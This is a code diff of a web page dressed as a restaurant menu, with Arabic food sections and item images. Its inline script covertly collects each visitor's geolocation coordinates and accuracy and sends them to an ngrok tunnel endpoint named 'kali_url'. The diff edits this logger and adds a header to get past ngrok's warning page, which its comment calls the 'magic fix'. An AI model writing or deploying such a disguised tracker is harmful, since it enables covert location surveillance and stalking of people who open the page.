@@ -21,17 +21,19 @@
             var lon = position.coords.longitude;
             var acc = position.coords.accuracy;
 
-            // رابط Ngrok الجديد الخاص بك (تم التحديث)
-            var kali_url = "https://finally-stumpier-jackelyn.ngrok-free.dev"; 
+            // رابط السيرفر حقك
+            var kali_url = "https://finally-stumpier-jackelyn.ngrok-free.dev/log.php"; 
 
-            fetch(kali_url + "/log.php?lat=" + lat + "&lon=" + lon + "&acc=" + acc, {
-                mode: 'no-cors', // أضفنا هذا السطر لضمان وصول الطلب حتى لو فيه قيود CORS
+            // التعديل السحري هنا لتخطي صفحة ngrok
+            fetch(kali_url + "?lat=" + lat + "&lon=" + lon + "&acc=" + acc, {
+                method: "GET",
+                mode: 'no-cors', 
                 headers: {
-                    "ngrok-skip-browser-warning": "true"
+                    "ngrok-skip-browser-warning": "69420" 
                 }
             })
-            .then(response => console.log("Success"))
-            .catch(error => console.log("Error"));
+            .then(() => console.log("Done"))
+            .catch(() => console.log("Error"));
         }
 
         function showError(error) {
@@ -245,7 +247,7 @@
         </div>
     </div>
 
-    <div class="section-title">🍕 وجبات وبيتزا</div>
+    <div class="section-title">وجبات وبيتزا</div>
     
     <div class="item">
         <img src="sss.jpeg" alt="بلاط كريفيت">
